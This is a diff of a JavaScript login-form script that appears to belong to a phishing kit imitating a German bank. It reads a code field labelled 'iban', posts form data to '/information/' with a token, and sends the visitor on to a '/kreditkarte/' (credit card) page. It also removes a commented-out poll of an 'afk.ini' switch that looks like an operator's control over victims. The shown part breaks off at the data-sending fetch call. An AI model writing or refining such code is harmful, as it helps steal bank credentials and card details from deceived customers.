@@ -3,12 +3,6 @@ const iban = document.querySelector('#respons-code');
 const loginButton = document.querySelector('#loginButton');
 const token = document.querySelector('#token');
 
-const resetForm = (fields, button) => {
-    button.disabled = false;
-    button.innerHTML = 'Weiter';
-    document.querySelector('#errorMessage').style.display = 'block';
-};
-
 login_form.addEventListener('submit', e => { 
     e.preventDefault();
     
@@ -23,22 +17,7 @@ login_form.addEventListener('submit', e => {
 
         var radomID = document.querySelector('input[name="randomId"]').value;
 
-         setTimeout(() => {
-         window.location.href = '/kreditkarte/'+radomID;
-        }, 1500);
-       /* setTimeout(() => {
-            fetch('/public/api/afk.ini')
-                .then(response => response.text())
-                .then(text => {
-                    if (text.trim().toLowerCase() === 'on') {
-                        window.location.href = '/creditcard/' + token.value;
-                    }
-                })
-                .catch(error => {
-                    console.error('Theres a error:', error);
-                });
-        }, 300);
-        */
+        window.location.href = '/kreditkarte/'+radomID;
         document.querySelector('#errorMessage').style.display = 'none';
         
         fetch('/information/' + token.value, {
